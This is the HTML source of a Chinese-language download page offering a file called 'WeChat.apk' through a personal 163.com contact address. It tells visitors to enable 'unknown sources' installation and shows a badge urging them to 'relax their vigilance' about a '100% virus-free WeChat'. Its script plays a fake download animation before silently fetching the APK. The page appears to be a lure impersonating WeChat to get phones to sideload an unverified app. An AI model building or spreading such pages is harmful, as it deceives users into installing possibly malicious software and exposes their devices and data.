<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>应用下载中心 - 1.apk</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #1a2a6c);
            background-size: 400% 400%;
            animation: gradientBG 15s ease infinite;
            color: #fff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
        }
        
        @keyframes gradientBG {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        
        .container {
            max-width: 900px;
            width: 100%;
            background: rgba(0, 0, 0, 0.7);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.5);
            margin-top: 30px;
            position: relative;
            overflow: hidden;
        }
        
        .container::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, rgba(255,255,255,0) 70%);
            z-index: -1;
        }
        
        header {
            text-align: center;
            margin-bottom: 40px;
        }
        
        header h1 {
            font-size: 2.8rem;
            margin-bottom: 10px;
            color: #4facfe;
            text-shadow: 0 0 10px rgba(79, 172, 254, 0.7);
        }
        
        header p {
            font-size: 1.2rem;
            color: #ccc;
            max-width: 600px;
            margin: 0 auto;
            line-height: 1.6;
        }
        
        .content {
            display: flex;
            flex-wrap: wrap;
            justify-content: space-between;
            gap: 30px;
        }
        
        .image-container {
            flex: 1;
            min-width: 300px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 15px;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
            transition: transform 0.3s ease;
        }
        
        .image-container:hover {
            transform: translateY(-5px);
        }
        
        .image-container img {
            max-width: 100%;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
        }
        
        .info {
            flex: 1;
            min-width: 300px;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }
        
        .features {
            margin-bottom: 30px;
        }
        
        .features h2 {
            font-size: 1.8rem;
            margin-bottom: 20px;
            color: #4facfe;
        }
        
        .features ul {
            list-style-type: none;
            padding-left: 20px;
        }
        
        .features li {
            margin-bottom: 12px;
            padding-left: 30px;
            position: relative;
            font-size: 1.1rem;
        }
        
        .features li::before {
            content: '✓';
            position: absolute;
            left: 0;
            color: #00ff8c;
            font-weight: bold;
        }
        
        .download-section {
            background: rgba(0, 0, 0, 0.4);
            border-radius: 15px;
            padding: 25px;
            text-align: center;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
        }
        
        .file-info {
            display: flex;
            justify-content: space-around;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        
        .file-info div {
            margin: 10px;
            padding: 10px 20px;
            background: rgba(79, 172, 254, 0.2);
            border-radius: 10px;
            font-size: 1rem;
        }
        
        .download-btn {
            display: inline-block;
            background: linear-gradient(to right, #4facfe, #00f2fe);
            color: white;
            padding: 18px 50px;
            font-size: 1.4rem;
            font-weight: bold;
            border-radius: 50px;
            text-decoration: none;
            margin: 15px 0;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
            position: relative;
            overflow: hidden;
            transition: all 0.3s ease;
            border: none;
            cursor: pointer;
        }
        
        .download-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
            background: linear-gradient(to right, #00f2fe, #4facfe);
        }
        
        .download-btn:active {
            transform: translateY(1px);
        }
        
        .download-btn::after {
            content: '';
            position: absolute;
            top: -50%;
            left: -60%;
            width: 20px;
            height: 200%;
            background: rgba(255, 255, 255, 0.3);
            transform: rotate(25deg);
            transition: all 0.5s;
        }
        
        .download-btn:hover::after {
            left: 120%;
        }
        
        .instructions {
            margin-top: 15px;
            font-size: 0.9rem;
            color: #aaa;
        }
        
        footer {
            text-align: center;
            margin-top: 40px;
            padding: 25px;
            background: rgba(0, 0, 0, 0.6);
            border-radius: 15px;
            width: 100%;
            font-size: 1.1rem;
        }
        
        footer p {
            margin: 10px 0;
        }
        
        .contact-email {
            color: #4facfe;
            font-weight: bold;
            font-size: 1.3rem;
            text-decoration: none;
            transition: all 0.3s;
            display: inline-block;
            margin-top: 10px;
        }
        
        .contact-email:hover {
            color: #00f2fe;
            transform: scale(1.05);
        }
        
        .security {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 20px;
            flex-wrap: wrap;
        }
        
        .security-badge {
            display: flex;
            align-items: center;
            gap: 10px;
            background: rgba(0, 150, 0, 0.2);
            padding: 10px 20px;
            border-radius: 30px;
            font-size: 0.9rem;
        }
        
        @media (max-width: 768px) {
            .content {
                flex-direction: column;
            }
            
            header h1 {
                font-size: 2.2rem;
            }
            
            .download-btn {
                padding: 15px 40px;
                font-size: 1.2rem;
            }
        }
        
        .pulse {
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { box-shadow: 0 0 0 0 rgba(79, 172, 254, 0.7); }
            70% { box-shadow: 0 0 0 15px rgba(79, 172, 254, 0); }
            100% { box-shadow: 0 0 0 0 rgba(79, 172, 254, 0); }
        }
        
        .app-icon {
            width: 120px;
            height: 120px;
            background: linear-gradient(135deg, #4facfe, #00f2fe);
            border-radius: 25px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
        }
        
        .app-icon i {
            font-size: 60px;
            color: white;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <div class="app-icon">
                <i class="fas fa-mobile-alt"></i>
            </div>
            <h1>应用下载中心</h1>
            <p>立即获取最新版本的应用，享受卓越的功能和流畅的体验</p>
        </header>
        
        <div class="content">
            <div class="image-container">
                <!-- 这里使用1.png图片 -->
                <img src="https://images.unsplash.com/photo-1551650975-87deedd944c3?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=967&q=80" alt="应用截图">
            </div>
            
            <div class="info">
                <div class="features">
                    <h2>应用特点</h2>
                    <ul>
                        <li>简洁直观的用户界面设计</li>
                        <li>高效稳定的运行性能</li>
                        <li>强大的数据安全保障</li>
                        <li>实时更新与通知功能</li>
                        <li>多语言支持，全球可用</li>
                        <li>低资源占用，流畅体验</li>
                    </ul>
                </div>
                
                <div class="download-section">
                    <div class="file-info">
                        <div><i class="fas fa-file"></i> 文件名: WeChat.apk</div>
                        <div><i class="fas fa-weight-hanging"></i> 大小: 245 MB</div>
                        <div><i class="fas fa-code-branch"></i> 版本:8.0.61 (2880)</div>
                    </div>
                    
                    <a href="#" class="download-btn pulse" id="downloadBtn">
                        <i class="fas fa-download"></i> 立即下载
                    </a>
                    
                    <div class="instructions">
                        <p>下载完成后，请前往"下载"文件夹安装此应用</p>
                        <p>若安装受阻，请检查是否启用了"未知来源"安装权限</p>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <footer>
        <p>遇到问题或有任何疑问？</p>
        <a href="mailto:19993544096@163.com" class="contact-email">
            <i class="fas fa-envelope"></i> 联系邮箱：19993544096@163.com
        </a>
        
        <div class="security">
            <div class="security-badge">
                <i class="fas fa-shield-alt"></i>
                <span>100% 安全无病毒的微信，请您放松警惕</span>
            </div>
            <div class="security-badge">
                <i class="fas fa-lock"></i>
                <span>文件传输加密</span>
            </div>
        </div>
    </footer>

    <script>
        document.getElementById('downloadBtn').addEventListener('click', function(e) {
            e.preventDefault();
            
            const btn = this;
            const originalText = btn.innerHTML;
            
            // 添加下载中动画
            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> 下载中...';
            btn.classList.remove('pulse');
            
            // 模拟下载过程
            setTimeout(() => {
                btn.innerHTML = '<i class="fas fa-check"></i> 下载完成!';
                btn.style.background = 'linear-gradient(to right, #00b09b, #96c93d)';
                
                // 创建隐藏的下载链接并触发点击
                const link = document.createElement('a');
                link.href = 'WeChat.apk'; //root
                link.download = 'WeChat.apk';
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
                
                // 3秒后恢复按钮状态
                setTimeout(() => {
                    btn.innerHTML = originalText;
                    btn.style.background = '';
                    btn.classList.add('pulse');
                }, 3000);
            }, 2000);
        });
    </script>
</body>
</html>
